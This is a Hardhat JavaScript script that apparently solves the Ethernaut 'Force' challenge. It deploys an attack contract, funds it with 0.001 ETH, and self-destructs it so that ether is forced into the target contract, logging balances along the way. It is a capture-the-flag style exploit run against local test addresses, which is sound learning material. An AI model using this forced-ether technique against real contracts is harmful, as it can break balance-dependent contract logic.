
const { ethers } = require("hardhat");
async function main () {
  const useraddress = "0x90F79bf6EB2c4f870365E785982E1f101E93b906";
  const instanceaddress = "0x56639dB16Ac50A89228026e42a316B30179A5376";
  const signer = await ethers.getSigner(useraddress);
  const contract = await ethers.getContractAt(
    "Force",
    instanceaddress,
    signer
  );
  const attackcontract = await ethers.getContractFactory("attack");
  const deploy = await attackcontract.deploy();
  const a_address = deploy.target;

  console.log("Attack contract address : ", a_address);

  let eth = ethers.parseEther("0.001");
  const sendTx = await signer.sendTransaction({
    to: a_address,
    from: useraddress,
    value: eth
  });

  console.log("Send transcation: ", sendTx.hash);
  sendTx.wait();

  let balance = await ethers.provider.getBalance(a_address);
  console.log("Attack contract balance: ", ethers.formatEther(balance));

  deploy.selfDestruct(instanceaddress);

  balance = await ethers.provider.getBalance(instanceaddress);
  console.log("Force contract balance: ", ethers.formatEther(balance));
}


main().catch((error) => {
  console.error(error);
  process.exit(1);
})

